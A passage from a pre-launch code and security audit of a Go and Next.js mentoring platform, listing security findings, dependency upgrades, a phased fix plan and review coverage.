- **S6 (L8)** Tiptap rich text is sanitized only on load and at render (`htmlContent()`), not at save — correct today, but any future consumer that renders `about`/`description` without `HtmlContent` becomes stored XSS. **Fix:** add server-side sanitization on save, or at least a prominent code comment.
- **D2 (dependency/security)** `sharp` override — even though components bypass the optimizer, the `/_next/image` endpoint remains reachable and would use Next's bundled `sharp@0.34.5` (vulnerable libvips) on any `remotePatterns`-allowed URL. If you keep image optimization at all (W5 option a), add an npm `overrides` entry forcing `sharp ≥0.35` under Next and re-run `npm audit` + a prod build. If you delete optimization (W5 option b), this is moot.

**Security verified clean:** no committed secrets (git history checked — only `*.example` ever added; `yandex-ca.pem` is a public CA cert); parameterized SQL + column allowlist; JWT algorithm-confusion guard + type binding; IDOR ownership checks on all mentor-request read/update/decline and admin role gates; base64 image validated by declared type + magic-byte sniff + 10 MB cap; CORS rejects wildcard-with-credentials at config validation; `SetTrustedProxies` prevents XFF spoofing; server-side captcha on all public writes; least-privilege CI token scopes; OIDC (no long-lived AWS keys); no `pull_request_target`; deploy is `workflow_dispatch`-only; ECR token piped over ssh stdin (never on VM disk); no SSRF, no open redirect; HttpOnly/SameSite=Lax/Secure session cookies.

### 4.5 Dependencies

**Before launch (security-driven, low risk):**
- **D1** `go get google.golang.org/grpc@v1.83.0 && go mod tidy` — fixes GO-2026-6061 (indirect dep; low real exposure since no gRPC server, but a one-line fix). Run `make ci`.
- **D2** `sharp` override (see above) — only if keeping image optimization.
- **D3** Bump `web/Dockerfile` `node:26.5.0-alpine3.23` → `26.5.1` (Node security release).
- **D4** Pin `api/Dockerfile` `golang:1.26-alpine` → `golang:1.26.5-alpine` (floating tag + layer cache can silently retain an old digest carrying stdlib vulns); refresh local Go toolchains off 1.25.5; consider raising the `go 1.25.0` directive to `go 1.26.0`.
- **D5** Cheap patch bumps in the same pass: `next` 16.2.11→16.2.12 (+ `eslint-config-next`/`@next/eslint-plugin-next` 16.2.12 to match), `react`/`react-dom` 19.2.0→19.2.8, `gin-contrib/cors` 1.7.0→1.7.7.

**After launch (routine):** `@types/node` ^22→^26 (currently mismatched vs Node 26 runtime); Tailwind 3→4 (config/build migration with visual-regression risk — defer); Jest 29→30, ESLint 9→10 (dev-only); Go module refreshes (`zap` 1.26→1.28, `prometheus/client_golang` 1.19→1.24 — test `/metrics` after, `posthog-go`, `pgx`, align `otelhttp`/`otelgin` contrib versions); actions `checkout@v5`/`setup-node@v5`/`build-push-action@v6` + SHA-pinning (S1); consolidate the three client analytics stacks (`react-gtm-module` is unmaintained). `patrickmn/go-cache` is unmaintained but trivially used and CVE-free — fine to keep (or remove via A19). `uuid ^14` is legitimate (not a typo).

**Coverage note:** `npm outdated`/`npm audit` and `govulncheck` all ran with network access. `npm audit`'s only findings (3 high) all chain to Next's bundled `postcss`/`sharp` and are addressed by D2 + accepting build-time postcss risk; the app's direct `postcss`/`sharp` are already patched.

---

## 5. Implementation plan

Branch strategy: land each phase as its own PR(s). Cross-cutting changes (env contracts, API contract) go in a single commit per CLAUDE.md. All API work must pass `make ci` from `api/`; all web work `npm run lint && npm run test && npx tsc --noEmit` from `web/`.

### Phase 0 — Launch blockers (do before going live)
1. **B1** S3 nil-guard + startup validation + `recover()` in the async upload goroutine. *(API, S)*
2. **B2** `COALESCE(sort_order, 0)` in the three ScanMentor queries; add a regression test for a NULL-sort_order mentor. *(API, S)*
3. **B3** `deploy.yml` — pass `TAG`/`service` via `env:`, reference `"$TAG"`; add an input regex validation. *(CI, S)*
4. **B4** Delete `headersToSpanAttributes` in `tracing-server.ts`. *(Web, XS)*
5. **B5** Route the four hand-rolled proxies through `sendUpstreamError`; port the Turnstile-reset effect into `ContactMentorForm`; add a test asserting a 4xx reaches the client and the widget resets. *(Web, S)*
6. **B6** Re-key `confirmResendRateLimiter` on token/email; document/adjust `contactRateLimiter`. *(API, S)*
7. **B7** Resolve the Ko-fi placeholder (+ `FUNDING.yml`); wire or remove the amount picker. *(Web, XS)*
8. **B8** Fix the three backup-credential comments to match fail-fast. *(Infra, XS)*
9. **B9** `CODEOWNERS` → `* @glamcoder`; fix `web/.gitignore`; `git rm -r --cached web/.idea`. *(Repo, XS)*
10. **D1, D3, D4** grpc bump; Node 26.5.1; pin `golang:1.26.5-alpine`. **D5** patch bumps. *(Deps, S)*

Suggested grouping: one PR for API blockers (B1, B2, B6 + D1/D4), one for web blockers (B4, B5, B7 + D3/D5/B4), one for CI/infra/repo (B3, B8, B9 + S4). Estimated total: ~2–3 focused days.

### Phase 1 — High-value correctness & security hardening (first week post-launch)
- **A2** strict tag resolution in registration; **A3** atomic profile save + allow clearing `calendar_url`; **A4/A5** proper error→status mapping via sentinels.
- **A1** indexed `GetMentorByID`; **A9** add `login_token`/`email` indexes, drop redundant `slug` index; **A10** add the missing 000002 down migration.
- **S1 + I8** SHA-pin all actions + add Dependabot `github-actions`; **S2** nonce-based CSP; **S3** make SSH host-key fatal; **S4** fix gosec SARIF permission.
- **I1** stop attaching full `.env.runtime` to the frontend; **I2/I3** docker-socket proxy + `no-new-privileges`/`cap_drop`; **I5** log rotation; **I6** cAdvisor `restart: always`.
- **I9** add the missing env vars to both infra templates; **I4** fix deploy.yml build-args; **I7** fix restore runbooks.
- **Tests:** JWT + session-middleware suite, auth-service suite (expiry/single-use/eligibility), web auth verify/session route tests, ProfileForm save, reviews submit.

### Phase 2 — Maintainability (reduce duplication)
- **W1** unify the mentor/admin auth/API stack (biggest single win). **A16** unify the Go auth services + token generators + mentor SELECT const. **W6** shared form module (fixes the drifted select styles). **W10** shared requests-page helpers/shell. **W8** single `CalendarEmbed` (+ reconcile the calendlab `.ru`/`.com` domain). **A19** replace the tags cache with a plain struct (drops `patrickmn/go-cache`).
- Add `knip`/`eslint-plugin-unused-exports` (web) to prevent dead-export regrowth.

### Phase 3 — Cleanup & routine maintenance
- Delete dead code: **W9** (web unused exports), **A15** (Go unused sundries), **W-low** (`start2`/`dev2`, stray artifacts, Dockerfile comments), **A14** (dead config knobs), **infra L-items** (empty `infra/package-lock.json`, doc drift sweep).
- **W2/W3/W5** static-page SSR removal + homepage payload projection + resolve the image-optimization/`sharp` decision; **W4** search haystack; **W7** GTM env-gating.
- **A6** analytics `Close()`/drain + host alignment; **A7** ctx-aware Turnstile; **A8** atomic token clear; **A11** single-decode image pipeline; **A12** rotate `frontend.log`; **A18/A20/A21/A22** BASE_URL links, cron TZ, env doc contradictions, goroutine lifecycle.
- **Deps (after-launch set)**: `@types/node`, Go module refreshes, action major bumps, analytics-stack consolidation. Defer Tailwind 4 and Jest 30 until there's time for regression testing.

---

## 6. Appendix — severity legend & coverage

**Severity** reflects launch-time user/security impact. **Blocker** = will affect real users or expose a real attack path on day one. High/Medium/Low as tagged inline.

**Coverage:** `web/` read in full (all of `src/lib`, config, types, barrels, pages, key components; 10 API routes read fully + error handling grepped across all 39). `api/` — every Go file, all SQL migrations, Makefile/Dockerfile read; `go build`/`go vet` run. `infra/`, `.github/`, `grafana/`, `docs/`, root — read in full with env-var usage grep-verified against code. Dependencies — `npm outdated`/`npm audit`/`govulncheck` run with network access. The nine blockers and several mediums were independently re-verified against source before this report was written; that re-verification corrected one over-stated finding (the `sharp` render-path claim — see §1).
